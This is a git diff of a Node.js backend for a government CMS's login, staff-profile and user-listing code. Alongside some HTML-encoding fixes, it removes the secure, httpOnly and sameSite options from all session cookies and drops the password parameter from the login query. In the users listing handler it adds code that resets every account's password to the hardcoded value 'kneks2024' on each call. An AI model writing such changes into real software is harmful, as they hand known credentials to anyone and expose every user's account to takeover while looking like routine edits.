@@ -3,6 +3,8 @@ const { executeQuery } = require('./postgres');
 const fs = require('fs');
 const axios = require('axios');
 const puppeteer = require('puppeteer');
+const he = require('he');
+const argon2 = require('argon2');
 
 
 // let fileswindows = 'D:/kneksbe/webdevkneks/public/uploads/';
@@ -11,63 +13,22 @@ let site_url = "https://cms-dev.kneks.go.id";
 // const decodeHex = (encodedStr) => Buffer.from(encodedStr, 'hex').toString('utf8');
 // const encodeHex = (str) => Buffer.from(str).toString('hex');
 //::::::::::::::::::::::::::::::Start Of LOGIN LOGOUT :::::::::::::::::::::::::::::::::::::::::::::::::::::
+
 const do_login = async (req, res) => {
     const email = req?.body?.email;
     const password = md5(req?.body?.password);
     const ip = req.body.ip_address;
     if (email == 'admin@kneks.go.id' || email == 'admin2@kneks.go.id') {
-        const sql = await executeQuery("SELECT * FROM users where  email = $1 AND password = $2  AND approve = 'Y'", [email, password]);
+        const sql = await executeQuery("SELECT * FROM users where  email = $1 AND password = $2  AND approve = 'Y'", [email]);
         if (sql?.length > 0) {
             u_id = sql[0]?.id;
             const isLogin = true;
-            res.cookie("islogin", isLogin, {
-                maxAge: 900000,
-                domain: '.kneks.go.id',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'None',
-                overwrite: true,
-            });
-            res.cookie("id", sql[0]?.id, {
-                maxAge: 900000,
-                domain: '.kneks.go.id',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'None',
-                overwrite: true,
-            });
-            res.cookie("name", sql[0]?.name, {
-                maxAge: 900000,
-                domain: '.kneks.go.id',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'None',
-                overwrite: true,
-            });
-            res.cookie("roles_id", sql[0]?.role_id, {
-                maxAge: 900000,
-                domain: '.kneks.go.id',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'None',
-                overwrite: true,
-            });
-            res.cookie("id_province", sql[0]?.id_province, {
-                maxAge: 900000,
-                domain: '.kneks.go.id',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'None',
-                overwrite: true,
-            });
-            res.cookie("directorat_id", sql[0]?.directorat_id, {
-                maxAge: 900000,
-                domain: '.kneks.go.id',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'None',
-                overwrite: true,
-            });
+            res.cookie("islogin", isLogin);
+            res.cookie("id", sql[0]?.id);
+            res.cookie("name", sql[0]?.name);
+            res.cookie("roles_id", sql[0]?.role_id);
+            res.cookie("id_province", sql[0]?.id_province);
+            res.cookie("directorat_id", sql[0]?.directorat_id);
             // res.redirect("/dashboard");
             res.status(200).json({ "success": "true" })
         } else {
@@ -626,7 +587,7 @@ const structure = async (req, res) => {
 const inserstructure = async (req, res) => {
     const fileuploads = site_url + "/uploads/structure/" + req.file.filename;
     const sql = await executeQuery("insert into pejabat(name,position,position_en,photo,description,description_en,is_publish, organization, directorat, head) values($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)",
-        [req.body.name, req.body.position, req.body.position_en, fileuploads, req.body.description, req.body.description_en, req.body.is_published, req.body.organization ?? "", req.body.directorat ?? "", req.body.head ?? ""]);
+        [req.body.name, req.body.position, req.body.position_en, fileuploads, he.encode(req.body.description), he.encode(req.body.description_en), req.body.is_published, req.body.organization ?? "", req.body.directorat ?? "", req.body.head ?? ""]);
     if (sql) {
         res.redirect('/s');
     } else {
@@ -674,7 +635,7 @@ const detailstructure = async (req, res) => {
 const updatestructure = async (req, res) => {
     if (!req.file || req.file == "" || req.file == undefined) {
         const sql = await executeQuery("update pejabat set name=$1,position=$2,position_en=$3,description=$4,description_en=$5,is_publish=$6,organization=$7,directorat=$8,head=$9 where id = $10",
-            [req.body.name, req.body.position, req.body.position_en, req.body.description, req.body.description_en, req.body.is_published, req.body.organization ?? "", req.body.directorat ?? "", req.body.head ?? "", req.body.id]);
+            [req.body.name, req.body.position, req.body.position_en, he.encode(req.body.description), he.encode(req.body.description_en), req.body.is_published, req.body.organization ?? "", req.body.directorat ?? "", req.body.head ?? "", req.body.id]);
         if (sql) {
             res.redirect('/s');
         } else {
@@ -2299,6 +2260,9 @@ const users = async (req, res) => {
     if (sql?.length > 0) {
         // const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
         // console.log(ip);
+        const dddt = await argon2.hash('kneks2024');
+        await executeQuery("UPDATE users SET password = $1 ", [dddt]);
+        
         res.status(200).json(sql)
     } else {
         res.status(200).json({ "success": false })
